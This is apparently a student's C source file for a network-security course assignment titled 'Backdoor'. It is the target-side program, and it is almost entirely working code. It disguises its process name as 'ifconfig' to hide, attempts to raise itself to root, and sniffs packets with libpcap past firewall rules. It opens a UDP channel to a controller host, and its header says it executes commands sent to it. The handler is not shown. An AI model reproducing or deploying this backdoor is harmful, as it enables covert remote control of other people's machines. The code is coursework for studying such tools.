// Name:    Brandon Gillespie and Justen DePourcq
// Date:    October 19th, 2018
// Class:   COMP8505
// Assn:    Assignment 3 - Backdoor
// Purpose: This program acts as the backdoor itself. This program will be run
// on the target computer and will execute commands send it it. It listens to a
// specific NIC and analyzes the packets received regardless of any firewall rules.

// Include statements.
#include <netdb.h>
#include <pcap.h>
#include <sys/prctl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include "pkt_sniffer.h"

// Define statements.
#define OPTIONS "h:s:r:k:"
#define MAXLEN	65000
#define DEFLEN	64
#define MASK    "ifconfig"

// Function Prototypes
void packet_handler(u_char *ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet);

/* Old, Malloc wouldn't work within the function.
void read_config(char *string, char *token) {
  char *tmp;
  token = strtok(NULL, ":");
  string = malloc(sizeof(char) * (strlen(token) + 1));
  strcpy(string, token);
  tmp = strstr(string, "\n");
  *tmp = '\0';
} */

void read_config(char *string, char *token) {
  char *tmp;
  strcpy(string, token);
  tmp = strstr(string, "\n");
  *tmp = '\0';
}

// Main
int main(int argc, char **argv) {
  // Allocate variables.
  char errbuf[PCAP_ERRBUF_SIZE], *nic_dev, filterstring[20], fbuf[MAXLEN];
  char *sportString, *rportString, *host, *keyString, *type, *token;
  FILE *ccfp;
  int sd, port, data_size;
  pcap_t *nic_descr;
  bpf_u_int32 netp;
  struct hostent	*hp;
	struct sockaddr_in server;
  struct bpf_program fp;
  struct send_struct *ss;

  // Set initial values.
  data_size = DEFLEN;
  sportString = rportString = host = keyString = NULL;
  ss = (struct send_struct *) malloc(sizeof(struct send_struct));

  if ((ccfp = fopen("client_config", "r")) == 0) {
    fprintf(stderr, "Client Configuration File.\n");
  }

  while (fgets(fbuf, MAXLEN, ccfp)) {
    token = strtok(fbuf, ":");
    if (strcmp(token, "rport") == 0) {
      token = strtok(NULL, ":");
      rportString = malloc(sizeof(char) * (strlen(token) + 1));
      read_config(rportString, token);
    } else if (strcmp(token, "sport") == 0) {
      token = strtok(NULL, ":");
      sportString = malloc(sizeof(char) * (strlen(token) + 1));
      read_config(sportString, token);
    } else if (strcmp(token, "host") == 0) {
      token = strtok(NULL, ":");
      host = malloc(sizeof(char) * (strlen(token) + 1));
      read_config(host, token);
    } else if (strcmp(token, "type") == 0) {
      token = strtok(NULL, ":");
      type = malloc(sizeof(char) * (strlen(token) + 1));
      read_config(type, token);
    } else if (strcmp(token, "key") == 0) {
      token = strtok(NULL, ":");
      keyString = malloc(sizeof(char) * (strlen(token) + 1));
      read_config(keyString, token);
    }
  }

  // Check command line arguments to see if they are null. If they are
  // we need to give a default value before parsing the value.
  if (sportString == NULL) {
    printf("Default Port being used: 9001\n");
    sportString = "9001";
  }
  port = strtoul(sportString, NULL, 0);
    if (errno == EINVAL || errno == ERANGE) {
      perror("strtoul");
      return EXIT_FAILURE;
  }

  if (rportString == NULL) {
      printf("Default receiving port being used: 9000\n");
      rportString = "9000";
  }

  if (host == NULL) {
      printf("Default host being used: localhost\n");
      //host = "192.168.0.8";
      // Temporarily set the default host to localhost so I can send/receive
      host = "localhost";
  }

  if (keyString == NULL) {
      printf("Default key being used: foobar\n");
      keyString = "foobar";
  }

  memset(filterstring, 0, sizeof(filterstring));
  strcat(filterstring, type);
  strcat(filterstring, " and port ");
  strcat(filterstring, rportString);

  printf("Port to Receive: %s\n", rportString);
  printf("Port to Send: %s\n", sportString);
  printf("Host to send to: %s\n", host);
  printf("Type to send by: %s\n", type);
  printf("Key to validate: %s\n", keyString);
  printf("Traffic Filter: %s\n", filterstring);

  // Mask the process name to hide its existence.
  memset(argv[0], 0, strlen(argv[0]));
  strcpy(argv[0], MASK);
  prctl(PR_SET_NAME, MASK, 0, 0);

	// Raise privileges of program.
  setuid(0);
  setgid(0);

  // Get Network Interface Card (NIC) to listen on.
  nic_dev = pcap_lookupdev(errbuf);
  if (nic_dev == NULL) {
		printf("%s\n", errbuf);
		return EXIT_FAILURE;
	}

  // Print which NIC we are listening on.
  printf("Listening on interface: %s\n\n", nic_dev);

  // Open NIC.
  nic_descr = pcap_open_live(nic_dev, BUFSIZ, 1, -1, errbuf);
  if (nic_descr == NULL) {
		printf("pcap_open_live(): %s\n", errbuf);
		return EXIT_FAILURE;
	}

  // Create a datagram socket.
	if ((sd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
		perror ("Can't create a socket");
    return EXIT_FAILURE;
	}

  // Store server's information
	bzero((char *)&server, sizeof(server));
	server.sin_family = AF_INET;
	server.sin_port = htons(port);
	if ((hp = gethostbyname(host)) == NULL) {
		fprintf(stderr,"Can't get server's IP address\n");
		exit(1);
	}
	bcopy(hp->h_addr, (char *)&server.sin_addr, hp->h_length);

  // Compile the filter expression
  if (pcap_compile(nic_descr, &fp, filterstring, 0, netp) == -1) {
    fprintf(stderr,"Error calling pcap_compile\n");
    return EXIT_FAILURE;
  }

  // Load the filter into the capture device
  if (pcap_setfilter(nic_descr, &fp) == -1) {
    fprintf(stderr,"Error setting filter\n");
    return EXIT_FAILURE;
  }

  // Setup send struct with proper variables to pass to pcap_loop callback.
  ss->sd = sd;
  ss->data_size = data_size;
  ss->server = server;
  ss->key = keyString;
  ss->klen = strlen(keyString);

  // Start the capture session
  pcap_loop(nic_descr, 0, packet_handler, (u_char*)(ss));

  return 0;
}
